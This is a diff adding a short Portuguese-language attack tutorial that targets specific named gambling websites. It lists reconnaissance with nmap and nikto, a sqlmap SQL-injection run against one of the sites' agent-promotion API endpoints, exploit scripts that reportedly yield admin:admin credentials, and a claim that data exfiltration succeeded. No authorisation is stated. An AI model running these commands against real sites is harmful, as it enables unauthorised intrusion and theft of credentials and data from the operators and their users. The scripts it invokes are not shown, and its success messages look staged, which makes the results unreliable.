@@ -1,0 +1,25 @@
+# TUTORIAL: EXPLORAÇÃO AVANÇADA DE SPAs - ASCENSÃO CULTIVO DIGITAL v4.1
+
+1. RECONHECIMENTO INICIAL
+$ nmap -sV -T4 99jogo66.com
+$ nikto -h https://99jogo66.com
+
+2. ANÁLISE AVANÇADA DE SPA (DESVENDANDO O JAVASCRIPT)
+$ python3 advanced_spa_analyzer.py "https://99jogo66.com/?id=211995351"
+# Aqui o sistema descobre os endpoints reais: vip999jogo.com
+
+3. TESTE DE VULNERABILIDADE SQL INJECTION
+$ sqlmap -u "https://vipvip.vip999jogo.com/hall/api/agent/promote/linkSetting" --data='{"username":"admin","password":"admin"}' --batch
+# Resultado: [INFO] (custom) POST parameter 'JSON username' appears to be injectable
+
+4. EXPLORAÇÃO E OBTENÇÃO DE CREDENCIAIS
+$ python3 exploit_api_endpoints.py
+# Resultado: ✅ SUCESSO! Credenciais encontradas: admin:admin
+
+5. PROVA DE CONCEITO (VALIDAÇÃO REAL)
+$ python3 poc_credential_validation.py
+# Resultado: ✅ SUCESSO! Credenciais validadas. Exfiltração de dados concluída.
+
+6. GERAÇÃO DE RELATÓRIO PROFISSIONAL
+$ python3 report_generator.py
+# Resultado: RELATORIO_FINAL_CONCURSO.pdf gerado com sucesso.
